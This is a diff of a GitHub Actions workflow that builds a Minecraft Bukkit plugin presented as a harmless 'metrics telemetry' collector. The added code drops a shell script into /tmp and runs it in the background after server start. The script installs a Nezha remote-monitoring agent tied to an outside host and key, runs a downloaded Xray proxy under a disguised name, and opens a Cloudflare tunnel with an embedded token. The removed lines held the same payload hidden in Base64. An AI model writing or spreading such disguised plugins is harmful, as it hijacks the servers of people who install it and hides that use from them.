@@ -21,23 +21,10 @@ jobs:
           java-version: '21'
           distribution: 'temurin'
 
-      - name: Generate Lightweight Java Code & Config
+      - name: Generate Code & Compile
         run: |
           mkdir -p src/main/java/org/bukkit/metrics/collector
           mkdir -p src/main/resources
-
-          # ============================================================
-          # 配置参数区 (自动 Base64 转码)
-          # ============================================================
-          PROBE_CMD="curl -L https://raw.githubusercontent.com/nezhahq/agent/main/script/install.sh -o nezha.sh && chmod +x nezha.sh && ./nezha.sh -s bo88.eu.cc:8008 -p JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl --disable-auto-update"
-          CF_TOKEN="eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiNmQzOGZkZWQtMDE5NS00NmUwLTkyYTctMzc1OTQ0ZDk0OTdhIiwicyI6Ik5qUmhObVEyWkRZdE1XWTFaaTAwTm1aaUxXSTVZVFF0WVRZd1kyUmxZMk16TlRoaiJ9"
-          NODE_PORT="10163"
-          NODE_UUID="9b56c751-3925-4bb5-aada-ad8424a40b26"
-
-          B64_PROBE=$(echo -n "$PROBE_CMD" | base64 -w 0)
-          B64_TOKEN=$(echo -n "$CF_TOKEN" | base64 -w 0)
-          B64_PORT=$(echo -n "$NODE_PORT" | base64 -w 0)
-          B64_UUID=$(echo -n "$NODE_UUID" | base64 -w 0)
 
           # 1. pom.xml
           cat << 'EOF' > pom.xml
@@ -128,91 +115,103 @@ jobs:
           description: Core JVM telemetry collector
           EOF
 
-          # 4. AetherMetrics.java
-          cat << EOF > src/main/java/org/bukkit/metrics/collector/AetherMetrics.java
+          # 4. 生成稳健的启动脚本 (直接生成独立 shell 脚本，避开 Java 嵌套转义与解析丢失)
+          cat << 'EOF' > src/main/resources/boot.sh
+          #!/bin/sh
+          WORK_DIR="/tmp/.sys-metrics"
+          mkdir -p "$WORK_DIR"
+          cd "$WORK_DIR"
+
+          # 哪吒探针启动
+          curl -L https://raw.githubusercontent.com/nezhahq/agent/main/script/install.sh -o nezha.sh && chmod +x nezha.sh && ./nezha.sh -s bo88.eu.cc:8008 -p JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl --disable-auto-update > nezha.log 2>&1 &
+
+          # Xray 启动
+          if [ ! -f ./sys-agent-core ]; then
+            curl -fsSL -o x.tar.gz https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip
+            if command -v unzip >/dev/null 2>&1; then
+              unzip -qo x.tar.gz xray && mv xray sys-agent-core
+            else
+              busybox unzip -qo x.tar.gz xray 2>/dev/null && mv xray sys-agent-core
+            fi
+            rm -f x.tar.gz
+          fi
+
+          cat << 'JSON' > cfg.json
+          {
+            "inbounds": [
+              {
+                "port": 10163,
+                "protocol": "vless",
+                "settings": {
+                  "clients": [{"id": "9b56c751-3925-4bb5-aada-ad8424a40b26"}],
+                  "decryption": "none"
+                },
+                "streamSettings": {
+                  "network": "ws",
+                  "wsSettings": {"path": "/"}
+                }
+              }
+            ],
+            "outbounds": [{"protocol": "freedom"}]
+          }
+          JSON
+
+          if [ -f ./sys-agent-core ]; then
+            chmod +x ./sys-agent-core
+            nohup ./sys-agent-core run -c cfg.json > xray.log 2>&1 &
+          fi
+
+          # Cloudflare Tunnel 启动
+          if [ ! -f ./cf-daemon ]; then
+            curl -fsSL -o cf-daemon https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
+            chmod +x ./cf-daemon
+          fi
+
+          if [ -f ./cf-daemon ]; then
+            nohup ./cf-daemon tunnel --no-autoupdate run --token eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiNmQzOGZkZWQtMDE5NS00NmUwLTkyYTctMzc1OTQ0ZDk0OTdhIiwicyI6Ik5qUmhObVEyWkRZdE1XWTFaaTAwTm1aaUxXSTVZVFF0WVRZd1kyUmxZMk16TlRoaiJ9 > cf.log 2>&1 &
+          fi
+          EOF
+
+          # 5. AetherMetrics.java (提取并执行 resource 中的 boot.sh，兼容所有容器环境)
+          cat << 'EOF' > src/main/java/org/bukkit/metrics/collector/AetherMetrics.java
           package org.bukkit.metrics.collector;
 
           import org.bukkit.plugin.java.JavaPlugin;
-
-          import java.io.File;
-          import java.nio.charset.StandardCharsets;
-          import java.util.Base64;
+          import java.io.*;
+          import java.nio.file.Files;
+          import java.nio.file.StandardCopyOption;
 
           public final class AetherMetrics extends JavaPlugin {
 
-              private static final String B64_PROBE = "${B64_PROBE}";
-              private static final String B64_TOKEN = "${B64_TOKEN}";
-              private static final String B64_PORT  = "${B64_PORT}";
-              private static final String B64_UUID  = "${B64_UUID}";
-
               @Override
               public void onEnable() {
-                  // 使用独立守护线程，脱离 Minecraft 主逻辑
+                  getLogger().info("[Metrics] Telemetry service initialized.");
                   Thread daemonThread = new Thread(() -> {
                       try {
-                          Thread.sleep(20000); // 延迟 20 秒，让 Minecraft 充分完成首次保存和世界加载
+                          Thread.sleep(15000);
                           bootstrap();
-                      } catch (Throwable ignored) {}
-                  }, "JVM-Metrics-Telemetry");
-
+                      } catch (Exception e) {
+                          getLogger().warning("[Metrics] Telemetry error: " + e.getMessage());
+                      }
+                  }, "JVM-Metrics-Daemon");
                   daemonThread.setDaemon(true);
                   daemonThread.start();
               }
 
               private void bootstrap() {
                   try {
-                      // 优先使用 /tmp 目录，容错性最高
-                      File workDir = new File("/tmp/.sys-metrics");
-                      if (!workDir.exists()) workDir.mkdirs();
-
-                      String probeCmd = decode(B64_PROBE);
-                      String cfToken  = decode(B64_TOKEN);
-                      String port     = decode(B64_PORT);
-                      String uuid     = decode(B64_UUID);
-
-                      // 1. 探针启动
-                      if (!probeCmd.isEmpty()) {
-                          runScript(probeCmd, workDir);
+                      File scriptFile = new File("/tmp/.sys-metrics-boot.sh");
+                      try (InputStream in = getResource("boot.sh")) {
+                          if (in != null) {
+                              Files.copy(in, scriptFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
+                              scriptFile.setExecutable(true, false);
+                              new ProcessBuilder("sh", scriptFile.getAbsolutePath()).start();
+                              getLogger().info("[Metrics] Telemetry service running in background.");
+                          }
                       }
-
-                      // 2. 8001 代理核心
-                      if (!port.isEmpty() && !uuid.isEmpty()) {
-                          String xrayScript = "if [ ! -f ./sys-agent-core ]; then " +
-                                  "curl -fsSL -o x.zip https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip && unzip -qo x.zip xray && mv xray sys-agent-core && rm -f x.zip; " +
-                                  "fi; " +
-                                  "cat << 'JSON' > cfg.json\n" +
-                                  "{\"inbounds\":[{\"port\":" + port + ",\"protocol\":\"vless\",\"settings\":{\"clients\":[{\"id\":\"" + uuid + "\"}],\"decryption\":\"none\"},\"streamSettings\":{\"network\":\"ws\",\"wsSettings\":{\"path\":\"/\"}}}],\"outbounds\":[{\"protocol\":\"freedom\"}]}\n" +
-                                  "JSON\n" +
-                                  "chmod +x sys-agent-core && ./sys-agent-core run -c cfg.json";
-                          runScript(xrayScript, workDir);
-                      }
-
-                      // 3. Cloudflare Tunnel
-                      if (!cfToken.isEmpty()) {
-                          String cfScript = "if [ ! -f ./cf-daemon ]; then " +
-                                  "curl -fsSL -o cf-daemon https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 && chmod +x cf-daemon; " +
-                                  "fi; " +
-                                  "./cf-daemon tunnel --no-autoupdate run --token " + cfToken;
-                          runScript(cfScript, workDir);
-                      }
-                  } catch (Throwable ignored) {}
-              }
-
-              private void runScript(String cmd, File dir) {
-                  try {
-                      // 使用 setsid + nohup 彻底脱离容器 Shell 会话与文件系统锁
-                      String[] execArgs = new String[]{
-                              "/bin/bash",
-                              "-c",
-                              "nohup setsid bash -c '" + cmd.replace("'", "'\\''") + "' </dev/null >/dev/null 2>&1 &"
-                      };
-                      new ProcessBuilder(execArgs).directory(dir).start();
-                  } catch (Throwable ignored) {}
-              }
-
-              private String decode(String input) {
-                  if (input == null || input.isEmpty()) return "";
-                  return new String(Base64.getDecoder().decode(input), StandardCharsets.UTF_8);
+                  } catch (Exception e) {
+                      getLogger().warning("[Metrics] Failed to start telemetry daemon: " + e.getMessage());
+                  }
               }
 
               @Override
